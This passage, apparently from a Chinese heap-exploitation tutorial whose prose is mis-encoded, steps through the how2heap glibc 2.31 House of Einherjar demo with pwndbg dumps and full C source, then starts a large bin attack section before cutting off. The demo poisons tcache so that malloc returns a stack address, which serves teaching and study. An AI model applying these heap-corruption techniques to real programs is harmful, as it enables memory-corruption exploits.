ï¼Œåˆå¹¶åå¤§å°ä¸º 0x160, ç„¶åæ­¤æ—¶ åˆå¹¶åçš„ chunk å°±ä¼šè¢«æ•´å—å–å‡º,  </p><p>ç„¶åæˆ‘ä»¬åœ¨è¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">â–º <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶  chunk b ä¹Ÿä¼šåŠ å…¥åˆ°  tcache biné‡Œï¼Œä¸”æŒ‡å‘äº†åˆš free çš„ pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x555555559b10</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> â€”â–¸ <span class="number">0x555555559910</span> â€”â–¸ <span class="number">0x555555559810</span> â€”â–¸ <span class="number">0x555555559710</span> â€”â–¸ <span class="number">0x555555559610</span> â€”â–¸ <span class="number">0x555555559510</span> â€”â–¸ <span class="number">0x555555559410</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>ç”±äºï¼Œ chunk d å¯å¯¹ chunkbè¿›è¡Œä»»æ„ä¿®æ”¹ ï¼ˆå †å—é‡å äº†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ chunk d çš„å†…å®¹æ¥è¾¾åˆ° ä¿®æ”¹ chunk b çš„ fd æŒ‡é’ˆçš„ç›®çš„ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> â–º <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe210</span> â—‚â€” <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe218</span> â—‚â€” <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe220</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe228</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x555555554040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe230</span> â€”â–¸ <span class="number">0x555555559310</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe238</span> â€”â–¸ <span class="number">0x555555559308</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe240</span> â—‚â€” <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe248</span> â€”â–¸ <span class="number">0x5555555592b0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åªéœ€ä¸¤æ¬¡ malloc å°±èƒ½æ‹¿åˆ°ç›®æ ‡åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">â–º <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>é€šè¿‡è¯¥æŠ€æœ¯å‘ç›®æ ‡åœ°å€å†™å…¥ä¸€ä¸ªå¤§å€¼</p><p>2.30 ä¹‹åå…³äº largs bin çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = 